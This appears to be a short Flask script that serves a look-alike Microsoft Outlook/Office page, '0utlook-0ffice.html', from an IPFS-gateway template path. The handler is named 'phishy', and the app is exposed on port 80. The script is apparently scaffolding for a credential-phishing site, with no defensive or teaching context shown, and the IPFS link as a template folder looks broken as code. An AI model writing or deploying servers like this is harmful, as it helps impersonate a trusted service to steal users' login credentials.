from flask import Flask, render_template

app = Flask(__name__, static_folder='', template_folder='bafybeihu3uva3efr4kmegn4w7va7q3n44segq3ifsyiawx4qydahs25vrm.ipfs.dweb.link')

@app.route('/0utlook-0ffice.html')
def phishy():
    return render_template('0utlook-0ffice.html')

if __name__ == '__main__':
    app.run('0.0.0.0', 80)